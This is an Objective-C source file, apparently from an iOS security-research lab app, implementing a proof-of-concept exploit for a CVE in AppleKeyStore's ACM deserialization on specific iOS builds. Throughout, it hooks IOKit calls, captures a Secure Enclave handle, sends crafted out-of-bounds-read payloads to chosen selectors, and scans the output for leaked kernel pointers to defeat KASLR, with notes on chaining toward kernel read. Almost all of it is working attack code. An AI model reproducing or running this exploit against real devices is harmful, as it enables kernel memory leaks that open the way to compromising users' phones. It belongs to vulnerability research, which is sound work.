//
//  P057AksDeserialize.m
//  P007OpenOnly
//
//  CVE-2026-65343 — AppleKeyStore ACM deserialize OOB read (KASLR).
//  Fixed 26.6.1 / 23G83. LIVE on 23F77 and 23G71.
//  Credits: Drinor Selmanaj (Sentry), Surya Narayan Kushwaha.
//  Layout from ByteV0rtex poc_aks_oob.m: handle[16], cmd_type u32,
//  cmd_size u32, declared_length u32 at +24.
//
//  23F77 Ghidra name is LibSer_ACMDeserializeSEPControlCode
//  (FUN_fffffff008d5cc80), ACM min size 0x18. Copyout that trusts
//  declared_length lives in AppleKeyStore, not that parse helper.
//
//  Live v4 (Lum1na aks-capture-v4, 2026-10-02): se_ok=YES hook_n=0
//  capture_done=0. type0+1 OPEN. sel0/1 kr=0 empty. sel2-4,6-7 2c2.
//  sel5 2c1 NotPrivileged. kptrs=0. v4 already sent declared=0x800
//  at +24 insz=28 on sel0-7 with a zero handle.
//
//  v9: sel 0/1 on our UC never reach ACMDeserialize (P104 live:
//  both are ungated no-ops, same as sel 16 SUCCESS-until-content).
//  The 163-sel megafunction jumptable @ 0xfffffff008d9f868 feeds
//  sel 16 → FUN_fffffff008d8ca10 → aks_sep_req_prepare_output_ool
//  (0xfffffff008d88a68). That is the copyout that trusts
//  declared_length. LibSer_ACMDeserializeSEPControlCode itself
//  lives in AppleSEPCredentialManager @ 0xfffffff008d5cc80.
//  This TAP: interpose + SE capture, then the 65343 envelope
//  (handle[16] + declared at +24) on sel 16 (and the captured
//  megafunction sel if it is in 0..0xa2 and not 5). Declared
//  0x28 then 0x100. STOP. No 163-sel. No sel5. No 0x800.

#import "P057AksDeserialize.h"
#import "P007Board.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <string.h>
#import <mach/mach.h>

#define P057_BUILD @"aks-p007-v9-sel16-feeder"
#define SE_KEY_TAG "com.research.p007.aks.v5"
#define OUTBUF_SZ  0x400u
#define FILL_BYTE  0xBBu
#define MSG_SZ     28u
#define P057_FEEDER_SEL 16u
#define P057_SEL_MAX    0xa2u

#ifndef DYLD_INTERPOSE
#define DYLD_INTERPOSE(_replacement, _replacee)                          \
    __attribute__((used))                                                 \
    static struct { const void *replacement; const void *replacee; }     \
    _interpose_##_replacee                                                \
    __attribute__((section("__DATA,__interpose"))) = {                   \
        (const void *)(unsigned long)&(_replacement),                    \
        (const void *)(unsigned long)&(_replacee)                        \
    };
#endif

typedef kern_return_t (*IOConnectCallMethod_fn)(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef kern_return_t (*IOConnectCallStructMethod_fn)(
    io_connect_t, uint32_t,
    const void *, size_t,
    void *, size_t *);

static volatile int          g_armed = 0;
static volatile long         g_hook_n = 0;
static volatile int          g_cap_done = 0;
static volatile io_connect_t g_cap_conn = 0;
static volatile uint32_t     g_cap_sel = 0;
static uint8_t               g_cap_handle[16];
static IOConnectCallMethod_fn       g_real_iocm = NULL;
static IOConnectCallStructMethod_fn g_real_iocsm = NULL;
/* v5: async entry points (SEP/ACM path may use them; v4 hook_n=0) */
typedef kern_return_t (*IOConnectCallAsyncMethod_fn)(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz);
typedef kern_return_t (*IOConnectCallAsyncStructMethod_fn)(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz);
static IOConnectCallAsyncMethod_fn       g_real_iocam = NULL;
static IOConnectCallAsyncStructMethod_fn g_real_iocasm = NULL;
static void p057_log(NSString *fmt, ...);
static kern_return_t my_IOConnectCallAsyncMethod(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz);
static kern_return_t my_IOConnectCallAsyncStructMethod(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz);
static volatile BOOL         g_running = NO;

static kern_return_t my_IOConnectCallMethod(
    io_connect_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
static kern_return_t my_IOConnectCallStructMethod(
    io_connect_t, uint32_t,
    const void *, size_t,
    void *, size_t *);

static void p057_resolve(void) {
    if (!g_real_iocm) {
        g_real_iocm = (IOConnectCallMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
        if (g_real_iocm == my_IOConnectCallMethod) g_real_iocm = NULL;
    }
    if (!g_real_iocsm) {
        g_real_iocsm = (IOConnectCallStructMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallStructMethod");
        if (g_real_iocsm == my_IOConnectCallStructMethod) g_real_iocsm = NULL;
    }
    if (!g_real_iocam) {
        g_real_iocam = (IOConnectCallAsyncMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallAsyncMethod");
        if (g_real_iocam == my_IOConnectCallAsyncMethod) g_real_iocam = NULL;
    }
    if (!g_real_iocasm) {
        g_real_iocasm = (IOConnectCallAsyncStructMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallAsyncStructMethod");
        if (g_real_iocasm == my_IOConnectCallAsyncStructMethod) g_real_iocasm = NULL;
    }
}

__attribute__((constructor))
static void p057_init(void) {
    p057_resolve();
}

static kern_return_t real_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    p057_resolve();
    if (!g_real_iocm) return KERN_FAILURE;
    return g_real_iocm(conn, sel, scalin, scalin_cnt,
                       structin, structin_sz,
                       scalout, scalout_cnt,
                       structout, structout_sz);
}

static void p057_maybe_capture(io_connect_t conn, uint32_t sel,
                              const void *structin, size_t structin_sz)
{
    g_hook_n++;
    if (!g_armed || g_cap_done) return;
    if (!structin || structin_sz < 16) return;
    const uint8_t *h = (const uint8_t *)structin;
    int nz = 0;
    for (int k = 0; k < 16; k++) if (h[k]) { nz = 1; break; }
    if (!nz) return;
    g_cap_conn = conn;
    g_cap_sel = sel;
    memcpy(g_cap_handle, h, 16);
    __asm__ __volatile__("dmb ish" ::: "memory");
    g_cap_done = 1;
}

static kern_return_t my_IOConnectCallMethod(
    io_connect_t conn, uint32_t sel,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    if (g_armed)
        p057_maybe_capture(conn, sel, structin, structin_sz);
    return real_IOConnectCallMethod(conn, sel, scalin, scalin_cnt,
                                    structin, structin_sz,
                                    scalout, scalout_cnt,
                                    structout, structout_sz);
}

static kern_return_t real_IOConnectCallStructMethod(
    io_connect_t conn, uint32_t sel,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz)
{
    p057_resolve();
    if (!g_real_iocsm) return KERN_FAILURE;
    return g_real_iocsm(conn, sel, structin, structin_sz, structout, structout_sz);
}

static kern_return_t my_IOConnectCallStructMethod(
    io_connect_t conn, uint32_t sel,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz)
{
    if (g_armed)
        p057_maybe_capture(conn, sel, structin, structin_sz);
    return real_IOConnectCallStructMethod(conn, sel, structin, structin_sz,
                                          structout, structout_sz);
}

DYLD_INTERPOSE(my_IOConnectCallMethod, IOConnectCallMethod)
DYLD_INTERPOSE(my_IOConnectCallStructMethod, IOConnectCallStructMethod)

/* v5: the SEP/ACM path may use the ASYNC entry points (hook_n=0 on v4
   with only the sync pair interposed). Cover all four, and log every
   call unconditionally so we can SEE what the SE sign path calls. */
static kern_return_t real_IOConnectCallAsyncMethod(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    p057_resolve();
    if (!g_real_iocam) return KERN_FAILURE;
    return g_real_iocam(conn, sel, wakePort, scalin, scalin_cnt,
                        structin, structin_sz, scalout, scalout_cnt,
                        structout, structout_sz);
}

static kern_return_t my_IOConnectCallAsyncMethod(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const uint64_t *scalin, uint32_t scalin_cnt,
    const void *structin, size_t structin_sz,
    uint64_t *scalout, uint32_t *scalout_cnt,
    void *structout, size_t *structout_sz)
{
    if (g_armed) {
        p057_log(@"[hook] ASYNC method sel=%u insz=0x%zx conn=0x%x",
                 sel, structin_sz, conn);
        p057_maybe_capture(conn, sel, structin, structin_sz);
    }
    return real_IOConnectCallAsyncMethod(conn, sel, wakePort, scalin, scalin_cnt,
                                         structin, structin_sz, scalout, scalout_cnt,
                                         structout, structout_sz);
}

static kern_return_t real_IOConnectCallAsyncStructMethod(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz)
{
    p057_resolve();
    if (!g_real_iocasm) return KERN_FAILURE;
    return g_real_iocasm(conn, sel, wakePort, structin, structin_sz,
                         structout, structout_sz);
}

static kern_return_t my_IOConnectCallAsyncStructMethod(
    io_connect_t conn, uint32_t sel, mach_port_t wakePort,
    const void *structin, size_t structin_sz,
    void *structout, size_t *structout_sz)
{
    if (g_armed) {
        p057_log(@"[hook] ASYNC struct sel=%u insz=0x%zx conn=0x%x",
                 sel, structin_sz, conn);
        p057_maybe_capture(conn, sel, structin, structin_sz);
    }
    return real_IOConnectCallAsyncStructMethod(conn, sel, wakePort,
                                               structin, structin_sz,
                                               structout, structout_sz);
}

DYLD_INTERPOSE(my_IOConnectCallAsyncMethod, IOConnectCallAsyncMethod)
DYLD_INTERPOSE(my_IOConnectCallAsyncStructMethod, IOConnectCallAsyncStructMethod)

static NSMutableString *p057_buf = nil;

static void p057_write_log(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"p057_aks_deserialize_log.txt"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = p057_buf.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
}

static void p057_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [p057_buf appendString:out];
    NSLog(@"p057 %@", line);
}

static const char *p057_krn(kern_return_t kr) {
    uint32_t u = (uint32_t)kr;
    if (u == 0) return "SUCCESS";
    if (u == 0xe00002c1) return "NotPrivileged";
    if (u == 0xe00002c2) return "BadArgument";
    if (u == 0xe00002c7) return "Unsupported";
    if (u == 0xe00002d5) return "Busy";
    if (u == 0xe00002e2) return "NotPermitted";
    if (u == 0xe00002f0) return "NotFound";
    return "?";
}

static int p057_looks_kptr(uint64_t v) {
    if ((v >> 32) == 0xfffffff0u && (v & 0xffffffffULL) != 0) return 1;
    if (v >= 0xFFFFFFE000000000ULL && v <= 0xFFFFFFE3FFFFFFFFULL) return 1;
    return 0;
}

static BOOL p057_trigger_se(void) {
    NSData *tag = [NSData dataWithBytes:SE_KEY_TAG length:strlen(SE_KEY_TAG)];
    NSDictionary *delQ = @{ (id)kSecClass: (id)kSecClassKey,
                            (id)kSecAttrApplicationTag: tag };
    SecItemDelete((__bridge CFDictionaryRef)delQ);

    CFErrorRef err = NULL;
    SecAccessControlRef acl = SecAccessControlCreateWithFlags(
        kCFAllocatorDefault, kSecAttrAccessibleAfterFirstUnlock, 0, &err);
    if (!acl) {
        p057_log(@"[se] ACL failed");
        if (err) CFRelease(err);
        return NO;
    }

    NSDictionary *attrs = @{
        (id)kSecAttrKeyType:       (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @256,
        (id)kSecAttrTokenID:       (id)kSecAttrTokenIDSecureEnclave,
        (id)kSecAttrAccessControl: (__bridge id)acl,
        (id)kSecPrivateKeyAttrs: @{
            (id)kSecAttrIsPermanent: @YES,
            (id)kSecAttrApplicationTag: tag,
        },
    };
    err = NULL;
    SecKeyRef key = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &err);
    CFRelease(acl);
    if (!key) {
        p057_log(@"[se] key create failed: %@",
                 err ? [(__bridge NSError *)err description] : @"?");
        if (err) CFRelease(err);
        return NO;
    }

    const uint8_t msg[32] = {0xDE, 0xAD, 0xBE, 0xEF};
    CFDataRef msgRef = CFDataCreate(NULL, msg, sizeof(msg));
    err = NULL;
    CFDataRef sig = SecKeyCreateSignature(
        key, kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &err);
    CFRelease(msgRef);
    CFRelease(key);
    BOOL ok = (sig != NULL);
    if (sig) CFRelease(sig);
    if (err) CFRelease(err);
    p057_log(@"[se] sign %@", ok ? @"OK" : @"failed");
    return ok;
}

static void p057_cleanup_se(void) {
    NSData *tag = [NSData dataWithBytes:SE_KEY_TAG length:strlen(SE_KEY_TAG)];
    NSDictionary *delQ = @{ (id)kSecClass: (id)kSecClassKey,
                            (id)kSecAttrApplicationTag: tag };
    SecItemDelete((__bridge CFDictionaryRef)delQ);
}

/* Megafunction feeder only (sel 16, plus a captured sel in 0..0xa2).
   declared is the u32 at +24. Never 0x400/0x800. Never sel 5. */
static int p057_probe(io_connect_t conn, const uint8_t *handle16,
                     int sel, uint32_t declared, uint32_t nscalar)
{
    if (sel < 0 || (uint32_t)sel > P057_SEL_MAX) return 0;
    if (sel == 0 || sel == 1 || sel == 5) return 0;
    if (declared > 0x100) return 0;
    if (nscalar > 1) return 0;

    uint8_t msg[MSG_SZ];
    memset(msg, 0, sizeof(msg));
    if (handle16) memcpy(msg, handle16, 16);
    uint32_t decl = declared;
    memcpy(msg + 24, &decl, 4);

    uint8_t outbuf[OUTBUF_SZ];
    memset(outbuf, FILL_BYTE, sizeof(outbuf));
    size_t outsz = sizeof(outbuf);
    uint64_t scalo[8] = {0};
    uint32_t scaln = 8;
    uint64_t scalin[1] = {0};

    kern_return_t kr = real_IOConnectCallMethod(
        conn, (uint32_t)sel,
        nscalar ? scalin : NULL, nscalar,
        msg, sizeof(msg),
        scalo, &scaln, outbuf, &outsz);

    int nonfill = 0;
    for (size_t i = 0; i < sizeof(outbuf); i++)
        if (outbuf[i] != FILL_BYTE) nonfill++;

    p057_log(@"  sel=%d nsc=%u decl=0x%x kr=0x%08x (%s) outsz=%zu nonfill=%d scaln=%u sc0=0x%llx",
             sel, nscalar, declared, kr, p057_krn(kr), outsz, nonfill, scaln,
             scaln ? scalo[0] : 0ULL);

    size_t hexn = outsz;
    if (hexn > 64) hexn = 64;
    if (hexn > sizeof(outbuf)) hexn = sizeof(outbuf);
    if (nonfill > 0 || (kr == KERN_SUCCESS && outsz > 0 && outsz != sizeof(outbuf))) {
        NSMutableString *hex = [NSMutableString string];
        for (size_t i = 0; i < hexn; i++)
            [hex appendFormat:@"%02x", outbuf[i]];
        p057_log(@"    hex[%zu]: %@", hexn, hex);
    }

    int found = 0;
    size_t scan = outsz < sizeof(outbuf) ? outsz : sizeof(outbuf);
    for (size_t i = 0; i + 8 <= scan; i += 8) {
        uint64_t v = 0;
        memcpy(&v, outbuf + i, 8);
        if (!p057_looks_kptr(v)) continue;
        found++;
        p057_log(@"  *** KPTR sel=%d decl=0x%x @+0x%04zx = 0x%016llx ***",
                 sel, declared, i, (unsigned long long)v);
        p057_log(@"      KASLR candidate only. Not hasKread. Not commitSlide.");
        [[P007Board shared] recordCandidate:v kind:@"kaslr" source:@"p057"];
    }
    return found;
}

/* v7 (Ghidra 23F77 decode of the LibSerialization.c chain):
   AppleKeyStoreCommand action (FUN_008d72c78, mdin/mdout) -> TLV walk
   (FUN_008d67874) -> case tag 0x33 -> ACMDeserializeSEPControlCode(blob+8,
   len-8, &out) -> FUN_008d5c7d0 -> deserializeParameters (FUN_008d5628c):
   ACM wire = [0x00..0x0F header, UNCHECKED][+0x10 u32 n_params, must be 0..0xa]
   [per param: u32 type | u32 len | len bytes, all bounds-checked].
   The bug: after a FULLY consumed param list the wrapper reads u32 at the
   FINAL offset with NO end check (FUN_008d5c7d0 *param_7 = *puVar1) and feeds
   it to the version gate — a 1-bit oracle on the first bytes AFTER our
   kernel-backed input buffer (KASLR, per the PoC). Fill the param so parsing
   ends exactly at the input end: 0x10 + 4(count) + 8(param hdr) + L = size.
   Bytes[4]=0x33 satisfies the walker tag too — one blob covers both shapes.
   v9: ONE call on the megafunction feeder (sel 16), not 0..40. */
static void p057_build_acm(uint8_t *buf, uint32_t buflen, uint32_t paramLen) {
    memset(buf, 0, buflen);
    buf[4] = 0x33;                       /* walker tag 0x33 */
    uint32_t count = 1;
    uint32_t type = 1;
    memcpy(buf + 0x10, &count, 4);
    memcpy(buf + 0x14, &type, 4);
    memcpy(buf + 0x18, &paramLen, 4);
    memset(buf + 0x1c, 0x11, paramLen);
}

static int p057_probe_acm(io_connect_t conn, int sel) {
    if (sel < 0 || (uint32_t)sel > P057_SEL_MAX) return 0;
    if (sel == 0 || sel == 1 || sel == 5) return 0;
    uint8_t blob[0x28];                  /* 0x10 + 4 + 8 + 12 = 0x28 */
    p057_build_acm(blob, (uint32_t)sizeof(blob), 12);
    uint8_t outbuf[OUTBUF_SZ];
    memset(outbuf, FILL_BYTE, sizeof(outbuf));
    size_t outsz = sizeof(outbuf);
    uint64_t scalo[8] = {0};
    uint32_t scaln = 8;

    kern_return_t kr = real_IOConnectCallMethod(
        conn, (uint32_t)sel, NULL, 0, blob, sizeof(blob),
        scalo, &scaln, outbuf, &outsz);

    int nonfill = 0;
    for (size_t i = 0; i < sizeof(outbuf); i++)
        if (outbuf[i] != FILL_BYTE) nonfill++;

    p057_log(@"  acm sel=%2d insz=0x28 kr=0x%08x (%s) outsz=%zu nonfill=%d scaln=%u sc0=0x%llx",
             sel, kr, p057_krn(kr), outsz, nonfill, scaln, scaln ? scalo[0] : 0ULL);

    size_t hexn = outsz;
    if (hexn > 64) hexn = 64;
    if (hexn > sizeof(outbuf)) hexn = sizeof(outbuf);
    if (nonfill > 0) {
        NSMutableString *hex = [NSMutableString string];
        for (size_t i = 0; i < hexn; i++)
            [hex appendFormat:@"%02x", outbuf[i]];
        p057_log(@"    hex[%zu]: %@", hexn, hex);
    }

    int found = 0;
    size_t scan = outsz < sizeof(outbuf) ? outsz : sizeof(outbuf);
    for (size_t i = 0; i + 8 <= scan; i += 8) {
        uint64_t v = 0;
        memcpy(&v, outbuf + i, 8);
        if (!p057_looks_kptr(v)) continue;
        found++;
        p057_log(@"  *** KPTR acm sel=%d @+0x%04zx = 0x%016llx ***",
                 sel, i, (unsigned long long)v);
        p057_log(@"      KASLR candidate only. Not hasKread. Not commitSlide.");
        [[P007Board shared] recordCandidate:v kind:@"kaslr" source:@"p057"];
    }
    return found;
}

@implementation P057AksDeserialize

+ (NSString *)tap {
    @synchronized ([P057AksDeserialize class]) {
        if (g_running) return @"p057 already running — one tap at a time";
        g_running = YES;
    }

    p057_buf = [NSMutableString string];
    p057_log(@"=== p057 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P057_BUILD);
    p057_log(@"CVE-2026-65343 AKS ACM deserialize OOB read. KASLR, not KRW, not kreadbuf.");
    p057_log(@"Fixed 26.6.1 → LIVE on 23F77 / 23G71.");
    p057_log(@"Ghidra: LibSer_ACMDeserializeSEPControlCode @ fffffff008d5cc80 (ACM min 0x18, AppleSEPCredentialManager).");
    p057_log(@"Feeder: megafunction sel %u (jumptable @ fffffff008d9f868 → FUN_8d8ca10 → prepare_output_ool 8d88a68).",
             P057_FEEDER_SEL);
    p057_log(@"P104 live 23F77+24A435: sel 0/1/16 ungated SUCCESS. Sel 0/1 never reach ACMDeserialize.");
    p057_log(@"163-sel 0x800 crash sweep PARK. sel5 PARK. declared<=0x100.");
    p057_log(@"");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p057"];
    if (stop) {
        p057_log(@"%@", stop);
        p057_write_log();
        @synchronized ([P057AksDeserialize class]) { g_running = NO; }
        return p057_buf;
    }
    p057_log(@"%@", [LabDeviceProfile identBlock]);
    p057_write_log();

    p057_resolve();
    p057_log(@"[hook] real IOConnectCallMethod=%p CallStructMethod=%p",
             g_real_iocm, g_real_iocsm);

    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
    if (!svc) {
        p057_log(@"[-] AppleKeyStore not found");
        p057_write_log();
        @synchronized ([P057AksDeserialize class]) { g_running = NO; }
        return p057_buf;
    }

    io_connect_t opened[2] = {0, 0};
    uint32_t nopened = 0;
    static const uint32_t kTypes[] = { 0, 1 };
    for (uint32_t t = 0; t < 2; t++) {
        io_connect_t cnx = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), kTypes[t], &cnx);
        p057_log(@"[+] IOServiceOpen type=%u kr=0x%x conn=%u", kTypes[t], kr, cnx);
        if (kr == KERN_SUCCESS && cnx) opened[nopened++] = cnx;
    }
    IOObjectRelease(svc);
    if (nopened == 0) {
        p057_log(@"[-] AKS open failed both types");
        p057_write_log();
        @synchronized ([P057AksDeserialize class]) { g_running = NO; }
        return p057_buf;
    }
    io_connect_t conn = opened[0];

    /* Phase 1: interposition self-test on OUR imported symbol. */
    g_armed = 1;
    g_hook_n = 0;
    g_cap_done = 0;
    g_cap_conn = 0;
    g_cap_sel = 0;
    memset(g_cap_handle, 0, sizeof(g_cap_handle));
    __asm__ __volatile__("dmb ish" ::: "memory");

    uint8_t probeMsg[MSG_SZ];
    memset(probeMsg, 0, sizeof(probeMsg));
    uint8_t ob[0x40];
    memset(ob, 0, sizeof(ob));
    size_t osz = sizeof(ob);
    uint64_t sc[4] = {0};
    uint32_t scn = 4;
    IOConnectCallMethod(conn, 0, NULL, 0, probeMsg, sizeof(probeMsg),
                        sc, &scn, ob, &osz);
    long self_n = g_hook_n;
    g_armed = 0;
    p057_log(@"[hook] self-test hook_n=%ld (1=interpose ALIVE on this UC; 0=dyld4 never routed)",
             self_n);

    /* Phase 2: SE sign with hook armed. v4: se_ok=YES, hook_n=0 (secd XPC). */
    g_hook_n = 0;
    g_cap_done = 0;
    g_armed = 1;
    __asm__ __volatile__("dmb ish" ::: "memory");
    BOOL seOk = p057_trigger_se();
    __asm__ __volatile__("dmb ish" ::: "memory");
    g_armed = 0;
    p057_log(@"[hook] during SE: se_ok=%@ hook_n=%ld captured=%d cap_sel=%u",
             seOk ? @"YES" : @"NO", g_hook_n, g_cap_done, g_cap_sel);

    uint8_t handle[16];
    memset(handle, 0, 16);
    BOOL haveHandle = NO;
    uint32_t feeders[2] = { P057_FEEDER_SEL, P057_FEEDER_SEL };
    uint32_t nfeeders = 1;
    if (g_cap_done && g_cap_conn) {
        memcpy(handle, g_cap_handle, 16);
        haveHandle = YES;
        p057_log(@"[+] ACM captured conn=%u sel=%u — using real handle on the captured sel AND sel %u",
                 g_cap_conn, g_cap_sel, P057_FEEDER_SEL);
        if (g_cap_sel <= P057_SEL_MAX && g_cap_sel != 5 &&
            g_cap_sel != P057_FEEDER_SEL && g_cap_sel > 1) {
            feeders[nfeeders++] = g_cap_sel;
        }
        conn = g_cap_conn;
    } else {
        p057_log(@"[*] no in-process ACM (secd XPC or interpose miss). Feeder sel %u on our UC.",
                 P057_FEEDER_SEL);
        p057_log(@"    Sel 0/1 are the wrong surface (P104 ungated no-ops). Not probed.");
        p057_log(@"    ByteV0rtex 163-sel zero-handle 0x800 sweep stays PARKED (crash).");
    }
    p057_write_log();

    /* Phase 3: 65343 envelope on the megafunction feeder (sel 16). */
    p057_log(@"");
    p057_log(@"[3] feeder sel(s) + declared 0x28 then 0x100. 0-scalar and 1-scalar. Not sel 0/1.");
    int totalKptr = 0;
    static const uint32_t decls[] = { 0x28, 0x100 };
    for (uint32_t oi = 0; oi < nopened; oi++) {
        io_connect_t c = (g_cap_done && g_cap_conn) ? conn : opened[oi];
        if (!c) continue;
        for (uint32_t fi = 0; fi < nfeeders; fi++) {
            for (uint32_t di = 0; di < 2; di++) {
                for (uint32_t ns = 0; ns <= 1; ns++) {
                    totalKptr += p057_probe(c, haveHandle ? handle : NULL,
                                            (int)feeders[fi], decls[di], ns);
                }
            }
        }
        if (g_cap_done && g_cap_conn) break;
    }
    p057_log(@"[3] done kptrs=%d handle=%@ feeders=%u,%u",
             totalKptr, haveHandle ? @"real" : @"zero",
             feeders[0], nfeeders > 1 ? feeders[1] : feeders[0]);
    if (totalKptr > 0) {
        p057_log(@"*** copyout produced kernel-range qwords. KASLR sibling of aio84530.");
        p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
        p057_log(@"NEXT: paste hex; 0x800 on THIS selector only after you authorize.");
    } else {
        p057_log(@"No kptrs on feeder at decl<=0x100.");
        p057_log(@"[4] ACM TLV tag 0x33 on the feeder only (not 0..40). insz=0x28.");
        int acmKptr = 0;
        for (uint32_t oi = 0; oi < nopened; oi++) {
            io_connect_t c = (g_cap_done && g_cap_conn) ? conn : opened[oi];
            if (!c) continue;
            for (uint32_t fi = 0; fi < nfeeders; fi++)
                acmKptr += p057_probe_acm(c, (int)feeders[fi]);
            if (g_cap_done && g_cap_conn) break;
        }
        p057_log(@"[4] done acm_kptrs=%d (feeder only; no 0x800, no 163, no size-sweep).", acmKptr);
        if (acmKptr > 0) {
            p057_log(@"*** copyout produced kernel-range qwords from the ACM OOB. KASLR sibling of aio84530.");
            p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
        }
        /* Slack vs exact parse-end on the feeder only. Difference in kr
           means the deserialize path ran (1-bit oracle). */
        p057_log(@"[5] oracle variants on feeder (A=slack vs B=exact parse-end):");
        for (uint32_t fi = 0; fi < nfeeders; fi++) {
            uint32_t selX = feeders[fi];
            kern_return_t krA = 0, krB = 0;
            for (int variant = 0; variant < 2; variant++) {
                uint8_t blob[0x40];
                if (variant) {
                    p057_build_acm(blob, 0x28, 12);
                } else {
                    memset(blob, 0, sizeof(blob));
                    blob[4] = 0x33;
                    uint32_t count = 1, type = 1, n4 = 4;
                    memcpy(blob + 0x10, &count, 4);
                    memcpy(blob + 0x14, &type, 4);
                    memcpy(blob + 0x18, &n4, 4);
                    memset(blob + 0x1c, 0x22, 4);
                }
                uint32_t insz = variant ? 0x28 : 0x2c;
                uint8_t outb[0x400];
                memset(outb, 0xBB, sizeof(outb));
                size_t oszB = sizeof(outb);
                uint64_t scal[8] = {0};
                uint32_t scn2 = 8;
                kern_return_t kr2 = real_IOConnectCallMethod(
                    conn, selX, NULL, 0, blob, insz, scal, &scn2, outb, &oszB);
                if (variant) krB = kr2; else krA = kr2;
                p057_log(@"  oracle sel=%u %@ kr=0x%08x (%s)",
                         selX, variant ? @"exact" : @"slack", kr2, p057_krn(kr2));
                if (variant == 1 && krB != krA)
                    p057_log(@"  [ORACLE] sel=%u kr@slack=0x%08x != kr@exact=0x%08x <- "
                             @"PARSE-END OBSERVABLE", selX, krA, krB);
            }
        }
        p057_log(@"[5] done (feeder slack/exact only).");
    }

    for (uint32_t i = 0; i < nopened; i++) {
        if (opened[i] && opened[i] != g_cap_conn) IOServiceClose(opened[i]);
    }
    p057_cleanup_se();

    p057_log(@"");
    p057_log(@"=== END p057 (%@) ===", [P007Board shared].kreadSignal);
    p057_write_log();
    @synchronized ([P057AksDeserialize class]) { g_running = NO; }
    return p057_buf;
}

@end
